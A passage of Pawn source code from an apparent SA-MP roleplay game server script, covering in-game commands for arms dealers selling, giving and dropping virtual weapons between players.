        if(PlayerInfo[playerid][pArmsSkill] < 400) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 6499) {
            weapon = 27; price = 6500;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"sniper",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 400) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 6999) {
            weapon = 34; price = 7000;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"ak47",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 200) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 3499) {
            weapon = 30; price = 3500;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"m4",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 200) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 4499) {
            weapon = 31; price = 4500;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"rifle",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 50) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 999) {
            weapon = 33; price = 1000;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else { SendClientMessage(playerid,COLOR_GREY,"   Invalid Weapon name!"); return 1; }
    if(ProxDetectorS(5.0, playerid, giveplayerid)) {
        if(PlayerInfo[giveplayerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "That player is currently restricted from possessing weapons!");

        if(giveplayerid == playerid) {
            format(string, sizeof(string), "   You have given yourself a %s.", x_weapon);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            SendClientMessage(playerid, COLOR_GRAD1, string);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            switch(PlayerInfo[playerid][pSex])
			{
                case 1: format(string, sizeof(string), "* %s created a Gun from Materials, and hands it to himself.", GetPlayerNameEx(playerid));
                case 2: format(string, sizeof(string), "* %s created a Gun from Materials, and hands it to herself.", GetPlayerNameEx(playerid));
            }
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            GivePlayerValidWeapon(playerid,weapon,50000);
            PlayerInfo[playerid][pMats] -= price;
            if(weapon > 15) {
                #if defined DOUBLE_EXP_ENABLED
					new hour,minuite,second;
					gettime(hour,minuite,second);
					if(DoubleEXPcheck(hour))
					{
				    	PlayerInfo[playerid][pArmsSkill] += 2;
				    	SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
					}
					else
					{
						SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
						PlayerInfo[playerid][pArmsSkill]++;
					}
				#else
					PlayerInfo[playerid][pArmsSkill]++;
				#endif
            }

            SetPVarInt(playerid, "ArmsTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);

            if(PlayerInfo[playerid][pArmsSkill] == 50)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Your Arms Dealer Skill is now Level 2, more weapons are available to sell."); }
            else if(PlayerInfo[playerid][pArmsSkill] == 100)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Your Arms Dealer Skill is now Level 3, more weapons are available to sell."); }
            else if(PlayerInfo[playerid][pArmsSkill] == 200)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Your Arms Dealer Skill is now Level 4, more weapons are available to sell."); }
            else if(PlayerInfo[playerid][pArmsSkill] == 400)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Your Arms Dealer Skill is now Level 5, more weapons are available to sell."); }
            return 1;
        }

        format(string, sizeof(string), "* You offered %s to buy a %s.", GetPlayerNameEx(giveplayerid), x_weapon);
        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
        format(string, sizeof(string), "* Arms Dealer %s wants to sell you a %s, (type /accept weapon) to buy.", GetPlayerNameEx(playerid), x_weapon);
        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
        GunOffer[giveplayerid] = playerid;
        GunId[giveplayerid] = weapon;
        GunMats[giveplayerid] = price;

        SetPVarInt(playerid, "ArmsTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);
    }
    else
	{
        SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
        return 1;
    }
	return 1;
}

CMD:giveweapon(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
		return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");

	if(GetPVarInt(playerid, "EventToken") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "You can't use this while you're in an event.");

	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0||GetPlayerState(playerid) == 7)
		return SendClientMessage (playerid, COLOR_GRAD2, "You can't do this at this time.");

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage (playerid, COLOR_GRAD2, "You can't give weapons in a vehicle!");

	new
		Float:health,
		string[128];

	GetPlayerHealth(playerid, health);

	if(health < 80)
		return SendClientMessage(playerid, COLOR_GRAD1, "You can't give weapons if your health is below 80!");

	if(GetPVarInt(playerid, "GiveWeaponTimer") > 0) {
		format(string, sizeof(string), "You must wait %d seconds before giving another weapon.", GetPVarInt(playerid, "GiveWeaponTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	new
		giveplayerid,
		weapon[64];

	if(sscanf(params, "us[64]", giveplayerid, weapon)) {
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /giveweapon [playerid/partofname] [weapon name]");
		SendClientMessage(playerid, COLOR_GRAD2, "Available Names: sdpistol, shotgun, 9mm, mp5, uzi, tec9, rifle, deagle, ak47, m4, spas12, sniper");
		SendClientMessage(playerid, COLOR_GRAD2, "Available Names: flowers, knuckles, baseballbat, cane, shovel, poolcue, golfclub, katana, dildo, parachute");
		return 1;
	}

	if(giveplayerid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't give a weapon to this player as they're not connected.");

	if(IsPlayerInAnyVehicle(giveplayerid))
		return SendClientMessage (playerid, COLOR_GRAD2, "You can't give weapons to players in vehicles!");

	if(giveplayerid == playerid)
		return SendClientMessage(playerid, COLOR_GRAD1, "You can't give a weapon to yourself!");

	if(!ProxDetectorS(3.0, playerid, giveplayerid))
		return SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");

	if(PlayerInfo[playerid][pFaction] != PlayerInfo[giveplayerid][pFaction] && PlayerInfo[playerid][pFaction] > 0)
		return SendClientMessage(playerid, COLOR_GRAD1, "You can't give weapons to players outside your faction!");

	if(PlayerInfo[giveplayerid][pConnectTime] < 2)
		return SendClientMessage(playerid, COLOR_GRAD2, "That player is currently restricted from possessing weapons");

	if(IsPlayerInAnyVehicle(giveplayerid))
		return SendClientMessage(playerid, COLOR_GRAD2, "Please exit the vehicle, before using this command.");

	if(strcmp(weapon, "9mm", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 22)
		{
			if(PlayerInfo[giveplayerid][pGuns][2] != 22 && PlayerInfo[giveplayerid][pGuns][2] != 23 && PlayerInfo[giveplayerid][pGuns][2] != 24)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your 9mm pistol.");
				format(string, sizeof(string), "* %s has given %s their 9mm pistol.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 22);
				GivePlayerValidWeapon(giveplayerid, 22, 60000);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "sdpistol", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 23)
		{
			if(PlayerInfo[giveplayerid][pGuns][2] != 22 && PlayerInfo[giveplayerid][pGuns][2] != 23 && PlayerInfo[giveplayerid][pGuns][2] != 24)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your silenced pistol.");
				format(string, sizeof(string), "* %s has given %s their silenced pistol.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 23);
				GivePlayerValidWeapon(giveplayerid, 23, 60000);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "deagle", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 24)
		{
			if(PlayerInfo[giveplayerid][pGuns][2] != 22 && PlayerInfo[giveplayerid][pGuns][2] != 23 && PlayerInfo[giveplayerid][pGuns][2] != 24)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your Desert Eagle.");
				format(string, sizeof(string), "* %s has given %s their Desert Eeagle.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 24);
				GivePlayerValidWeapon(giveplayerid, 24, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "shotgun", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 25)
		{
			if(PlayerInfo[giveplayerid][pGuns][3] != 25 && PlayerInfo[giveplayerid][pGuns][3] != 27)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your shotgun.");
				format(string, sizeof(string), "* %s has given %s their shotgun.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 25);
				GivePlayerValidWeapon(giveplayerid, 25, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "spas12", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 27)
		{
			if(PlayerInfo[giveplayerid][pGuns][3] != 25 && PlayerInfo[giveplayerid][pGuns][3] != 27)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your SPAS-12.");
				format(string, sizeof(string), "* %s has given %s their SPAS-12.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 27);
				GivePlayerValidWeapon(giveplayerid, 27, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "mp5", true) == 0) {
		if(PlayerInfo[playerid][pGuns][4] == 29)
		{
			if(PlayerInfo[giveplayerid][pGuns][4] != 28 && PlayerInfo[giveplayerid][pGuns][4] != 29 && PlayerInfo[giveplayerid][pGuns][4] != 32)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your MP5.");
				format(string, sizeof(string), "* %s has given %s their MP5.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 29);
				GivePlayerValidWeapon(giveplayerid, 29, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "uzi", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 28)
		{
			if(PlayerInfo[giveplayerid][pGuns][4] != 28 && PlayerInfo[giveplayerid][pGuns][4] != 29 && PlayerInfo[giveplayerid][pGuns][4] != 32)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your Micro SMG.");
				format(string, sizeof(string), "* %s has given %s their Micro SMG.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 28);
				GivePlayerValidWeapon(giveplayerid, 28, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "tec9", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 32)
		{
			if(PlayerInfo[giveplayerid][pGuns][4] != 28 && PlayerInfo[giveplayerid][pGuns][4] != 29 && PlayerInfo[giveplayerid][pGuns][4] != 32)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your Tec-9.");
				format(string, sizeof(string), "* %s has given %s their Tec-9.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 32);
				GivePlayerValidWeapon(giveplayerid, 32, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "ak47", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 30)
		{
			if(PlayerInfo[giveplayerid][pGuns][5] != 30 && PlayerInfo[giveplayerid][pGuns][5] != 31)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your AK-47.");
				format(string, sizeof(string), "* %s has given %s their AK-47.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 30);
				GivePlayerValidWeapon(giveplayerid, 30, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "m4", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 31)
		{
			if(PlayerInfo[giveplayerid][pGuns][5] != 30 && PlayerInfo[giveplayerid][pGuns][5] != 31)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your M4.");
				format(string, sizeof(string), "* %s has given %s their M4.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 31);
				GivePlayerValidWeapon(giveplayerid, 31, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "rifle", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 33)
		{
			if(PlayerInfo[giveplayerid][pGuns][6] != 33 && PlayerInfo[giveplayerid][pGuns][6] != 34)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your rifle.");
				format(string, sizeof(string), "* %s has given %s their rifle.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 33);
				GivePlayerValidWeapon(giveplayerid, 33, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}

	else if(strcmp(weapon, "sniper", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 34)
		{
			if(PlayerInfo[giveplayerid][pGuns][6] != 33 && PlayerInfo[giveplayerid][pGuns][6] != 34)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your sniper rifle.");
				format(string, sizeof(string), "* %s has given %s their sniper rifle.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 34);
				GivePlayerValidWeapon(giveplayerid, 34, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player already has a similar weapon!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "flowers", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 14)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your flowers.");
			format(string, sizeof(string), "* %s has given %s their flowers.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 14);
			GivePlayerValidWeapon(giveplayerid, 14, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "knuckles", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][0] == 1)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your brass knuckles.");
			format(string, sizeof(string), "* %s has given %s their brass knuckles.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 1);
			GivePlayerValidWeapon(giveplayerid, 1, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "baseballbat", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 5)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your baseball bat.");
			format(string, sizeof(string), "* %s has given %s their baseball bat.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 5);
			GivePlayerValidWeapon(giveplayerid, 5, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "cane", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your cane.");
			format(string, sizeof(string), "* %s has given %s their cane.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 15);
			GivePlayerValidWeapon(giveplayerid, 15, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "shovel", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your shovel.");
			format(string, sizeof(string), "* %s has given %s their shovel.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 6);
			GivePlayerValidWeapon(giveplayerid, 6, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "golfclub", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 2)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your golf club.");
			format(string, sizeof(string), "* %s has given %s golf club.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 2);
			GivePlayerValidWeapon(giveplayerid, 2, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "katana") == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 8)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your katana.");
			format(string, sizeof(string), "* %s has given %s their katana.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 8);
			GivePlayerValidWeapon(giveplayerid, 8, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "dildo", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your dildo.");
			format(string, sizeof(string), "* %s has given %s their dildo.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 10);
			GivePlayerValidWeapon(giveplayerid, 10, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(weapon, "parachute", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][11] == 46)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have given away your parachute.");
			format(string, sizeof(string), "* %s has given %s their parachute.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 46);
			GivePlayerValidWeapon(giveplayerid, 46, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You have entered an invalid weapon name.");
	}

	return 1;
}

CMD:dropweapon(playerid, params[])
{
	return cmd_dropgun(playerid, params);
}

CMD:dropgun(playerid, params[])
{
	if(isnull(params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /dropweapon [weapon name]");
		SendClientMessage(playerid, COLOR_GRAD2, "Available Names: sdpistol, shotgun, 9mm, mp5, uzi, tec9, rifle, deagle, ak47, m4, spas12, sniper, camera");
		SendClientMessage(playerid, COLOR_GRAD2, "Available Names: flowers, knuckles, baseballbat, cane, shovel, poolcue, golfclub, katana, dildo, parachute");
		if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Available Names: knife");
		}
		if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Available Names: nitestick, mace, smoke, chainsaw, fire");
		}
		return 1;
	}

	if(PlayerCuffed[playerid] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't use this command while you're cuffed/tazed.");

	if(IsPlayerInAnyVehicle(playerid))
	{
		SendClientMessage (playerid, COLOR_GRAD2, "You can't drop weapons in a vehicle!");
		return 1;
	}
	if(GetPVarInt(playerid, "PBM") > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken") != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You can't use this while you're in an event.");
		return 1;
	}
	new string[128];
	if(strcmp(params, "sdpistol", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 23)
		{
			if(pTazer[playerid] == 1) return SendClientMessage(playerid, COLOR_RED, "You can't drop your tazer.");
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your silenced pistol.");
